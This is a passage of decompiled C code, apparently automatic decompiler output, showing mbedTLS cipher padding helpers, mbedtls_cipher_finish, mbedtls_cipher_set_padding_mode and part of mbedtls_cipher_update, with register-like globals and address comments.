        *(char *)(a3 + a1) = (char)v1;
        int32_t v3 = g1; // 0x806970b21
        int32_t v4 = v3 % 256; // 0x806970b22
        g6 = v4;
        if (v1 > v4) {
            g1 = v3 + 1;
            *(char *)(v4 + a3 + a1) = (char)v1;
            int32_t result = g1; // 0x806970b
            int32_t v5 = result % 256; // 0x806970b
            g6 = v5;
            while (v1 > v5) {
                // 0x8069700
                g1 = result + 1;
                *(char *)(v5 + a3 + a1) = (char)v1;
                result = g1;
                v5 = result % 256;
                g6 = v5;
                // continue -> 0x8069700
            }
            // 0x8069713
            // branch -> 0x8069713
            // 0x8069713
            g2 = v2;
            return result;
        }
        // 0x8069713
        result2 = v3;
        // branch -> 0x8069713
    }
    // 0x8069713
    g2 = v2;
    return result2;
}

// Address range: 0x80697b0 - 0x80697ec
int32_t add_one_and_zeros_padding(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x80697b7
    int32_t v2 = a2 - a3; // 0x80697be
    *(char *)(a3 + a1) = -128;
    int32_t v3;
    if (v2 < 2) {
        // 0x80697b0
        // branch -> 0x80697e9
        // 0x80697e9
        g3 = v1;
        g2 = v3;
        return g1;
    }
    // 0x80697c9
    g1 = 2;
    *(char *)(a1 + 1 + a3) = 0;
    int32_t result = g1; // 0x80697e2
    int32_t v4 = result % 256; // 0x80697e2
    // branch -> 0x80697d8
    while (v2 > v4) {
        // 0x80697d8
        g6 = v4;
        g1 = result + 1;
        *(char *)(a1 + v4 + a3) = 0;
        result = g1;
        v4 = result % 256;
        // continue -> 0x80697d8
    }
    // 0x80697e9
    g3 = v1;
    g2 = v3;
    return result;
}

// Address range: 0x80697ed - 0x80697ef
int32_t function_80697ed(int32_t a1) {
    // 0x80697ed
    return g7;
}

// Address range: 0x80698a0 - 0x80698df
int32_t add_zeros_and_len_padding(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x80698ab
    int32_t v2 = a2 - a3; // 0x80698b1
    int32_t v3;
    if (v2 < 2) {
        // 0x80698d6
        *(char *)(a2 - 1 + a1) = (char)v2;
        g3 = v1;
        g2 = v3;
        return g1;
    }
    // 0x80698b8
    g1 = 2;
    *(char *)(a1 + a3) = 0;
    int32_t v4 = g1; // 0x80698cf14
    int32_t v5 = v4 % 256; // 0x80698cf15
    g6 = v5;
    if (v2 > v5) {
        g1 = v4 + 1;
        *(char *)(a1 - 1 + a3 + v5) = 0;
        int32_t v6 = g1; // 0x80698cf
        int32_t v7 = v6 % 256; // 0x80698cf
        g6 = v7;
        while (v2 > v7) {
            // 0x80698c8
            g1 = v6 + 1;
            *(char *)(a1 - 1 + a3 + v7) = 0;
            v6 = g1;
            v7 = v6 % 256;
            g6 = v7;
            // continue -> 0x80698c8
        }
        // 0x80698c8
        // branch -> 0x80698d6
    }
    // 0x80698d6
    // branch -> 0x80698d6
    // 0x80698d6
    *(char *)(a2 - 1 + a1) = (char)v2;
    g3 = v1;
    g2 = v3;
    return g1;
}

// Address range: 0x8069950 - 0x806996c
int32_t add_zeros_padding(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x8069950
    g6 = a2;
    g1 = a3;
    int32_t result2 = a3; // 0x806996c_2
    int32_t v1;
    if (a3 < a2) {
        // 0x8069960
        *(char *)(a1 + a3) = 0;
        int32_t v2 = g1 + 1; // 0x806996410
        g1 = v2;
        if (g6 > v2) {
            *(char *)(a1 + v2) = 0;
            int32_t result = g1 + 1; // 0x8069964
            g1 = result;
            while (g6 > result) {
                // 0x8069960
                *(char *)(a1 + result) = 0;
                result = g1 + 1;
                g1 = result;
                // continue -> 0x8069960
            }
            // 0x806996b
            // branch -> 0x806996b
            // 0x806996b
            g2 = v1;
            return result;
        }
        // 0x806996b
        result2 = v2;
        // branch -> 0x806996b
    }
    // 0x806996b
    g2 = v1;
    return result2;
}

// Address range: 0x806996d - 0x806996f
int32_t function_806996d(int32_t a1) {
    // 0x806996d
    return g7;
}

// Address range: 0x80699f7 - 0x80699ff
int32_t function_80699f7(int32_t a1) {
    // 0x80699f7
    return g7;
}

// Address range: 0x8069a00 - 0x8069b4f
int32_t mbedtls_cipher_finish(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x8069a06
    g3 = (int32_t)a1;
    int32_t v3 = g7; // 0x8069a0c
    g7 = (int32_t)a3;
    int32_t v4 = g5; // 0x8069a12
    g5 = a2;
    if (a1 == NULL || a3 == NULL || *a1 == 0) {
        // 0x8069a1c
        g1 = -0x6100;
        // branch -> 0x8069a21
        // 0x8069a21
        g7 = v3;
        return g4;
    }
    int32_t v5 = *a1; // edx
    *a3 = 0;
    int32_t v6 = *(int32_t *)(v5 + 4); // 0x8069a42
    g4 = v6;
    if (v6 != 5) {
        // 0x8069a4a
        if (v6 != 3) {
            // 0x8069a4f
            if (v6 != 6) {
                // 0x8069a54
                if (v6 != 7) {
                    // 0x8069a59
                    if (v6 == 1) {
                        // 0x8069a59
                        // branch -> 0x8069a98
                        // 0x8069a98
                        if (*(int32_t *)(g3 + 36) == 0) {
                            // 0x8069aa0
                            g1 = 0;
                            // branch -> 0x8069a21
                        } else {
                            // 0x8069a8f
                            g1 = -0x6280;
                            // branch -> 0x8069a21
                        }
                        // 0x8069a21
                        g7 = v3;
                        return g4;
                    }
                    // 0x8069a5e
                    g1 = -0x6080;
                    if (v6 == 2) {
                        int32_t v7 = g3; // 0x8069a68
                        int32_t v8 = *(int32_t *)(v7 + 8); // 0x8069a68
                        int32_t v9; // 0x8069b22
                        int32_t v10; // 0x8069b29
                        int32_t v11; // 0x8069af1
                        int32_t v12; // 0x8069b10
                        int32_t v13; // 0x8069adf
                        int32_t v14; // 0x8069af821
                        int32_t v15; // 0x8069aff
                        int32_t result; // 0x8069b2b
                        int32_t v16; // 0x8069b32
                        int32_t v17; // 0x8069b35
                        int32_t v18; // 0x8069b3b
                        int32_t v19; // 0x8069b41
                        int32_t v20; // 0x8069b05
                        if (v8 == 1) {
                            int32_t v21 = *(int32_t *)(v7 + 12); // 0x8069aa7
                            g1 = v21;
                            if (v21 == 0) {
                                // 0x8069a98
                                if (*(int32_t *)(v7 + 36) == 0) {
                                    // 0x8069aa0
                                    g1 = 0;
                                    // branch -> 0x8069a21
                                } else {
                                    // 0x8069a8f
                                    g1 = -0x6280;
                                    // branch -> 0x8069a21
                                }
                                // 0x8069a21
                                g7 = v3;
                                return g4;
                            }
                            int32_t v22 = *(int32_t *)(v7 + 36); // 0x8069aae
                            int32_t v23 = *(int32_t *)(v7 + 56); // 0x8069ab4
                            g237 = v23 == 0;
                            int32_t v24 = v23; // 0x8069ac1
                            if (v23 == 0) {
                                // 0x8069abb
                                v24 = *(int32_t *)(v5 + 16);
                                // branch -> 0x8069abe
                            }
                            // 0x8069abe
                            g6 = v22;
                            int32_t v25 = v7 + 20; // 0x8069ac5
                            g4 = v25;
                            ((int32_t (*)(int32_t, int32_t, int32_t))v21)(v25, v24, v22);
                            int32_t v26 = g3; // 0x8069ad4
                            int32_t v27 = *(int32_t *)v26; // 0x8069ad4
                            v11 = v26;
                            int32_t v28 = *(int32_t *)(v26 + 8); // 0x8069ae9
                            v14 = *(int32_t *)(v27 + 24);
                            // branch -> 0x8069adf
                            // 0x8069adf
                            v13 = *(int32_t *)(v27 + 28);
                            g4 = v13;
                            g6 = v14;
                            v15 = *(int32_t *)(v11 + 60);
                            g1 = v15;
                            v20 = *(int32_t *)(v13 + 8);
                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v20)(v15, v28, v14, v11 + 40, v25, g5);
                            if (g1 == 0) {
                                // 0x8069b10
                                v12 = g3;
                                v10 = *(int32_t *)v12;
                                if (*(int32_t *)(v12 + 8) != 0) {
                                    // 0x8069b17
                                    g4 = v10;
                                    if (v10 != 0) {
                                        // 0x8069b1f
                                        v9 = *(int32_t *)(v10 + 24);
                                        // branch -> 0x8069b22
                                    } else {
                                        v9 = 0;
                                    }
                                    // 0x8069b22
                                    *(int32_t *)g7 = v9;
                                    // branch -> 0x8069a21
                                    // 0x8069a21
                                    g7 = v3;
                                    return g4;
                                }
                                // 0x8069b29
                                g6 = v10;
                                result = *(int32_t *)(v12 + 16);
                                g4 = result;
                                g237 = v10 == 0;
                                if (v10 != 0) {
                                    // 0x8069b32
                                    v16 = *(int32_t *)(v10 + 24);
                                    g1 = v16;
                                    v19 = v16;
                                    // branch -> 0x8069b35
                                } else {
                                    v19 = 0;
                                }
                                // 0x8069b35
                                v17 = g7;
                                g3 = v2;
                                v18 = g5;
                                g7 = v3;
                                g5 = v4;
                                g2 = v1;
                                ((int32_t (*)(int32_t, int32_t, int32_t))result)(v18, v19, v17);
                                return result;
                            }
                            // 0x8069a21
                            g7 = v3;
                            return g4;
                        }
                        int32_t v29 = *(int32_t *)(v7 + 36); // 0x8069a70
                        g4 = v29;
                        int32_t v30 = *(int32_t *)(v5 + 24); // 0x8069a7f
                        g237 = v29 == v30;
                        if (v29 == v30) {
                            v11 = v7;
                            v14 = v29;
                            // 0x8069adf
                            v13 = *(int32_t *)(v5 + 28);
                            g4 = v13;
                            g6 = v14;
                            v15 = *(int32_t *)(v11 + 60);
                            g1 = v15;
                            v20 = *(int32_t *)(v13 + 8);
                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v20)(v15, v8, v14, v11 + 40, v7 + 20, g5);
                            if (g1 == 0) {
                                // 0x8069b10
                                v12 = g3;
                                v10 = *(int32_t *)v12;
                                if (*(int32_t *)(v12 + 8) != 0) {
                                    // 0x8069b17
                                    g4 = v10;
                                    if (v10 != 0) {
                                        // 0x8069b1f
                                        v9 = *(int32_t *)(v10 + 24);
                                        // branch -> 0x8069b22
                                    } else {
                                        v9 = 0;
                                    }
                                    // 0x8069b22
                                    *(int32_t *)g7 = v9;
                                    // branch -> 0x8069a21
                                    // 0x8069a21
                                    g7 = v3;
                                    return g4;
                                }
                                // 0x8069b29
                                g6 = v10;
                                result = *(int32_t *)(v12 + 16);
                                g4 = result;
                                g237 = v10 == 0;
                                if (v10 != 0) {
                                    // 0x8069b32
                                    v16 = *(int32_t *)(v10 + 24);
                                    g1 = v16;
                                    v19 = v16;
                                    // branch -> 0x8069b35
                                } else {
                                    v19 = 0;
                                }
                                // 0x8069b35
                                v17 = g7;
                                g3 = v2;
                                v18 = g5;
                                g7 = v3;
                                g5 = v4;
                                g2 = v1;
                                ((int32_t (*)(int32_t, int32_t, int32_t))result)(v18, v19, v17);
                                return result;
                            }
                        } else {
                            // 0x8069a84
                            if (*(int32_t *)(v7 + 12) == 0) {
                                // 0x8069a8b
                                if (v29 == 0) {
                                    // 0x8069aa0
                                    g1 = 0;
                                    // branch -> 0x8069a21
                                    // 0x8069a21
                                    g7 = v3;
                                    return g4;
                                }
                            }
                            // 0x8069a8f
                            g1 = -0x6280;
                            // branch -> 0x8069a21
                        }
                        // 0x8069a21
                        g7 = v3;
                        return g4;
                    }
                    // 0x8069a21
                    g7 = v3;
                    return g4;
                }
            }
        }
    }
    // 0x8069aa0
    g1 = 0;
    // branch -> 0x8069a21
    // 0x8069a21
    g7 = v3;
    return g4;
}

// Address range: 0x8069b50 - 0x8069bdf
int32_t mbedtls_cipher_set_padding_mode(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1;
    g6 = v1;
    g4 = a2;
    if (a1 != NULL) {
        // 0x8069b68
        if (*(int32_t *)(*a1 + 4) == 2) {
            // 0x8069b70
            switch (a2) {
                case 0: {
                    // 0x8069bb7
                    *(int32_t *)(v1 + 12) = 0x80696e0;
                    *(int32_t *)(g6 + 16) = 0x8069720;
                    return 0;
                }
                case 1: {
                    // 0x8069ba5
                    *(int32_t *)(v1 + 12) = 0x80697b0;
                    *(int32_t *)(g6 + 16) = 0x80697f0;
                    return 0;
                }
                case 2: {
                    // 0x8069b93
                    *(int32_t *)(v1 + 12) = 0x80698a0;
                    *(int32_t *)(g6 + 16) = 0x80698e0;
                    return 0;
                }
                case 3: {
                    // 0x8069b81
                    *(int32_t *)(v1 + 12) = 0x8069950;
                    *(int32_t *)(g6 + 16) = 0x8069970;
                    return 0;
                }
                case 4: {
                    // 0x8069bc9
                    *(int32_t *)(v1 + 12) = 0;
                    *(int32_t *)(g6 + 16) = 0x80699d0;
                    return 0;
                }
            }
            // 0x8069b62
            return -0x6080;
        }
    }
    // 0x8069b5d
    // branch -> 0x8069b62
    // 0x8069b62
    return -0x6100;
}

// Address range: 0x8069ed0 - 0x806a27f
int32_t mbedtls_cipher_update(char * a1, char * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8) {
    char * v1 = (char *)a3;
    int32_t v2;
    g2 = &v2;
    int32_t v3 = g3; // 0x8069ed6
    g3 = (int32_t)a1;
    int32_t v4 = (int32_t)a2;
    int32_t v5 = g7; // 0x8069ee2
    g7 = (int32_t)a5;
    int32_t v6 = g5; // 0x8069eea
    g5 = a3;
    if (a1 != NULL) {
        // 0x8069f10
        if (a5 != NULL) {
            int32_t v7 = *(int32_t *)a1; // 0x8069f14
            g4 = v7;
            if (v7 != 0) {
                // 0x8069f1a
                g4 = *(int32_t *)a1;
                *a5 = 0;
                int32_t v8 = g4; // 0x8069f22
                int32_t v9 = *(int32_t *)(v8 + 4); // 0x8069f22
                int32_t * v10; // 0x8069f4a_0
                int32_t * v11; // 0x806a064_0
                int32_t * v12; // 0x806a069_0
                int32_t * v13; // 0x806a07b_0
                int32_t * v14; // 0x806a0a1_0
                int32_t * v15; // 0x806a0ce_0
                int32_t * v16; // 0x806a11b_0
                int32_t * v17; // 0x806a21e_0
                int32_t v18; // eax
                int32_t v19; // edx
                int32_t v20; // 0x8069fe1
                char * v21;
                char * v22;
                char * v23;
                int32_t v24;
                int32_t v25; // 0x8069fcd
                int32_t v26; // 0x806a046
                int32_t v27; // 0x806a092
                int32_t v28; // 0x806a094
                int32_t v29; // 0x806a0d1
                int32_t v30; // 0x8069fe1
                int32_t v31; // 0x8069ffb
                int32_t v32; // 0x806a067
                int32_t v33; // 0x8069efd
                int32_t v34; // 0x8069f74
                int32_t v35; // 0x8069fb0
                int32_t v36; // 0x8069fde
                int32_t v37; // 0x806a003
                int32_t v38; // 0x806a011
                int32_t v39; // 0x806a032
                int32_t v40; // 0x806a050
                int32_t v41;
                int32_t v42; // 0x806a07b
                int32_t v43; // 0x806a09a
                int32_t v44; // 0x806a0a1
                int32_t v45; // 0x806a0de
                int32_t v46; // 0x806a0e1
                int32_t v47; // 0x806a0fc
                int32_t v48; // 0x806a1c8
                int32_t v49; // 0x806a266
                int32_t v50; // 0x8069fdb
                int32_t v51; // 0x8069f67
                int32_t v52; // 0x8069f6a
                int32_t v53; // 0x8069f6d
                int32_t v54; // 0x8069f91
                int32_t v55; // 0x8069fb0
                int32_t v56; // 0x8069fbb
                int32_t v57; // 0x8069fbe
                int32_t v58; // 0x806a003
                int32_t v59; // 0x806a00a
                int32_t v60; // 0x806a018
                int32_t v61; // 0x806a01b
                int32_t v62; // 0x806a022
                int32_t v63; // 0x806a029
                int32_t v64; // 0x806a053
                int32_t v65; // 0x806a09a
                int32_t v66; // 0x806a0a1
                int32_t v67; // 0x806a0b6
                int32_t v68; // 0x806a0e4
                int32_t v69; // 0x806a0e7
                int32_t v70; // 0x806a0fc
                int32_t v71; // 0x806a0ff
                int32_t v72; // 0x806a103
                int32_t v73; // 0x806a10a
                int32_t v74; // 0x806a152
                int32_t v75; // 0x806a155
                int32_t v76; // 0x806a167
                int32_t v77; // 0x806a1b3
                int32_t v78; // 0x806a1b6
                int32_t v79; // 0x806a1b9
                int32_t v80; // 0x806a1d6
                int32_t v81; // 0x806a1dd
                int32_t v82; // 0x806a1f3
                int32_t v83; // 0x806a1f6
                int32_t v84; // 0x806a266
                int32_t v85; // 0x806a064
                int32_t v86; // 0x8069f4a
                int32_t v87; // 0x8069f97
                int32_t v88; // 0x806a02f
                int32_t v89; // 0x806a110
                int32_t v90; // 0x806a16d
                int32_t v91; // 0x806a1e3
                if (v9 == 1) {
                    int32_t v92 = g5; // 0x806a226
                    int32_t v93 = *(int32_t *)(v8 + 24); // 0x806a226
                    g237 = v92 == v93;
                    g1 = -0x6280;
                    if (v92 == v93) {
                        // 0x806a234
                        *(int32_t *)g7 = v92;
                        g7 = v5;
                        g5 = v6;
                        int32_t v94 = g3; // 0x806a245
                        int32_t v95 = *(int32_t *)(v94 + 8); // 0x806a245
                        int32_t v96 = *(int32_t *)(v94 + 60); // 0x806a24b
                        g6 = v96;
                        g3 = v3;
                        int32_t v97 = *(int32_t *)(*(int32_t *)(g4 + 28) + 4); // 0x806a254
                        g1 = v97;
                        g2 = v2;
                        ((int32_t (*)(int32_t, int32_t, int32_t))v97)(v96, v95, v4);
                        // branch -> 0x806a25c
                        // 0x806a25c
                        if (*(int32_t *)(g3 + 36) == 0) {
                            // 0x806a266
                            v49 = g2;
                            v84 = *(int32_t *)(v49 - 36);
                            g4 = v84;
                            if (g5 % *(int32_t *)(v84 + 24) == 0) {
                                v36 = v49;
                                v21 = a2;
                                v22 = (char *)v95;
                                v23 = (char *)v96;
                                // 0x8069f4a
                                v10 = (int32_t *)(v36 - 32);
                                v86 = *v10;
                                if (v86 != 2) {
                                    // 0x8069f50
                                    g237 = v86 == 3;
                                    if (v86 != 3) {
                                        // 0x8069f5a
                                        g237 = v86 == 5;
                                        if (v86 == 5) {
                                            // 0x8069f64
                                            v51 = *(int32_t *)(v36 - 28);
                                            v52 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                            g1 = v52;
                                            v53 = *(int32_t *)(v36 - 60);
                                            g4 = v53;
                                            v34 = g3;
                                            v54 = *(int32_t *)(v34 + 60);
                                            g6 = v54;
                                            v87 = *(int32_t *)(v52 + 16);
                                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v87)(v54, g5, v34 + 36, v34 + 40, v34 + 20, v53, v51);
                                            if (g1 == 0) {
                                                // 0x8069fa2
                                                *(int32_t *)g7 = g5;
                                                // branch -> 0x8069efd
                                            }
                                        } else {
                                            // 0x806a140
                                            g237 = v86 == 7;
                                            g1 = -0x6080;
                                            if (v86 == 7) {
                                                // 0x806a14f
                                                v74 = *(int32_t *)(v36 - 28);
                                                g4 = v74;
                                                v75 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                                g1 = v75;
                                                v76 = *(int32_t *)(g3 + 60);
                                                g6 = v76;
                                                v90 = *(int32_t *)(v75 + 20);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t))v90)(v76, g5, *(int32_t *)(v36 - 60), v74);
                                                if (g1 == 0) {
                                                    // 0x806a178
                                                    *(int32_t *)g7 = g5;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                        }
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    // 0x806a1b0
                                    v77 = *(int32_t *)(v36 - 28);
                                    g4 = v77;
                                    v78 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                    g1 = v78;
                                    v79 = *(int32_t *)(v36 - 60);
                                    v48 = g3;
                                    v80 = *(int32_t *)(v48 + 8);
                                    v81 = *(int32_t *)(v48 + 60);
                                    g6 = v81;
                                    v91 = *(int32_t *)(v78 + 12);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v91)(v81, v80, g5, v48 + 36, v48 + 40, v79, v77);
                                    if (g1 != 0) {
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    // 0x8069fa2
                                    *(int32_t *)g7 = g5;
                                    // branch -> 0x8069efd
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069fb0
                                v35 = g3;
                                v55 = *(int32_t *)(v35 + 8);
                                if (v55 == 0) {
                                    // 0x8069fbb
                                    v56 = *(int32_t *)(v35 + 36);
                                    v18 = v56;
                                    v57 = *(int32_t *)(v36 - 36);
                                    g4 = v57;
                                    if (g5 + v56 <= *(int32_t *)(v57 + 24)) {
                                        // 0x806a205
                                        memcpy(v23, v22, (int32_t)v21);
                                        g1 = 0;
                                        v17 = (int32_t *)(g3 + 36);
                                        *v17 = g5 + *v17;
                                        // branch -> 0x8069efd
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    v25 = v56;
                                } else {
                                    // 0x806a128
                                    v82 = *(int32_t *)(v35 + 36);
                                    v18 = v82;
                                    if (v55 == 1) {
                                        // 0x806a1f3
                                        v83 = *(int32_t *)(v36 - 36);
                                        g4 = v83;
                                        if (g5 + v82 < *(int32_t *)(v83 + 24)) {
                                            // 0x806a205
                                            memcpy(v23, v22, (int32_t)v21);
                                            g1 = 0;
                                            v17 = (int32_t *)(g3 + 36);
                                            *v17 = g5 + *v17;
                                            // branch -> 0x8069efd
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        v25 = v82;
                                    } else {
                                        v25 = v82;
                                    }
                                }
                                // 0x8069fcd
                                if (v25 == 0) {
                                    // 0x806a073
                                    if (g5 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a07b
                                        v42 = g2;
                                        v13 = (int32_t *)(v42 - 36);
                                        *(int32_t *)(v42 - 40) = *v13;
                                        v28 = 0;
                                        if (*v13 != 0) {
                                            // 0x806a08a
                                            v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                            // branch -> 0x806a090
                                        }
                                        // 0x806a090
                                        v27 = g5;
                                        v24 = v27 % v28;
                                        if (v24 != 0) {
                                            // 0x806a090
                                            v67 = v24;
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = g3 + 20;
                                            *(int32_t *)(g2 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v71 = *(int32_t *)(v45 + 8);
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v71 = *(int32_t *)(v45 + 8);
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // 0x8069efd
                                                v33 = g2;
                                                g3 = *(int32_t *)(v33 - 12);
                                                g7 = *(int32_t *)(v33 - 8);
                                                g5 = *(int32_t *)(v33 - 4);
                                                g2 = *(int32_t *)v33;
                                                return g1;
                                            }
                                        }
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v65, v27, v43 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069fd5
                                v50 = v35 + 20;
                                *v10 = v50;
                                v30 = v18;
                                v20 = *(int32_t *)(*(int32_t *)(v36 - 36) + 24) - v30;
                                g4 = v20;
                                g237 = v50 + v30 == 0;
                                *(int32_t *)(g2 - 44) = v20;
                                memcpy(v23, v22, (int32_t)v21);
                                v31 = *(int32_t *)g3;
                                *(int32_t *)(g2 - 36) = *(int32_t *)(v31 + 28);
                                v37 = g2;
                                v58 = *(int32_t *)(v37 - 28);
                                v59 = *(int32_t *)(v37 - 32);
                                v38 = g3;
                                v60 = *(int32_t *)(v31 + 24);
                                v61 = *(int32_t *)(v37 - 36);
                                g6 = v61;
                                v62 = *(int32_t *)(v38 + 8);
                                v63 = *(int32_t *)(v38 + 60);
                                g1 = v63;
                                v88 = *(int32_t *)(v61 + 8);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v88)(v63, v62, v60, v38 + 40, v59, v58);
                                v39 = g2;
                                g4 = *(int32_t *)(v39 - 44);
                                if (g1 == 0) {
                                    // 0x806a03d
                                    v19 = *(int32_t *)g3;
                                    *(int32_t *)(v39 - 32) = *(int32_t *)g7;
                                    v26 = v19;
                                    *(int32_t *)(g2 - 36) = v26;
                                    if (v26 == 0) {
                                        // 0x806a03d
                                        v64 = 0;
                                        // branch -> 0x806a050
                                    } else {
                                        // 0x806a04d
                                        v64 = *(int32_t *)(v19 + 24);
                                        // branch -> 0x806a050
                                    }
                                    // 0x806a050
                                    v40 = g2;
                                    *(int32_t *)g7 = *(int32_t *)(v40 - 32) + v64;
                                    v41 = g2;
                                    v85 = 0;
                                    if (*(int32_t *)(v40 - 36) != 0) {
                                        // 0x806a05e
                                        v85 = *(int32_t *)(*(int32_t *)(v41 - 36) + 24);
                                        // branch -> 0x806a064
                                    }
                                    // 0x806a064
                                    v11 = (int32_t *)(v41 - 28);
                                    *v11 = *v11 + v85;
                                    v32 = g4;
                                    g5 -= v32;
                                    v12 = (int32_t *)(g2 - 60);
                                    *v12 = *v12 + v32;
                                    *(int32_t *)(g3 + 36) = 0;
